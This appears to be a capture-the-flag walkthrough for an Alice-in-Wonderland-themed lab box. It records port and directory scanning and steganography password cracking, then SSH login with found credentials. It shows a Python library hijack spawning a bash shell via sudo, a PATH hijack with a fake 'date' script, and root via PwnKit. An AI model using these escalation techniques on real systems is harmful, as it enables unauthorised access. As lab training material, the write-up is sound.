Started with a nmap scan
```
22 OpenSSH 7.6p1
80 Golang http server
```
Running nikto scan
Running gobuster scan
```
/img
/r   this page just says keep going which way do I go from here?
/poem    this is a poem  The poem is a nonsense poem called the The Jabberwock from 1871
/r/a/b/b/i/t 
```
Since I was not finding much I started to look at the pictures and the picture on the main site had a txt file hidden in it called `hint.txt` and the hint was `fallow the r a b b i t` 
`stegseek --crack pic.jpg -wl rockyou.txt` 
 none of the other pictures had anything in them
 Took a me a little bit but from the hint there is a folder on the webserver with a `/` after every letter looking in the source code of this website we found some creds these creds work for the ssh login now we have access to the server
 `alice:HowDo............................l` 
Looking in `alice` home folder there is a file called `walrus_and_the_carpenter.py` and looking at this file its not much other than reads `10` short poems out but it uses the `random` library from python looking for the path for the random.py file 
`find / -iname random.py 2>/dev/null` 
now we know that the import script stays after are home folder so we can make a python script called `random.py` and put this code in there 
```
import pty

pty.spawn("/bin/bash")
```
now we can run the python script with sudo as rabbit
`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
and now we are the user rabbit in the home folder of rabbit there is a file called `teaParty` and its exacting `date` with out a absolute path so we can export are own path and  then make a script called date in the tmp folder since that's were we going to set it
`export PATH=/tmp:$PATH` 
and for the script
```
#!/bin/bash
/bin/bash
```
and then `chmod +x` the file and now we are `hatter` there is a plain txt password on his home folder and now we have a stable shell as `hatter` then got `root` with PwnKit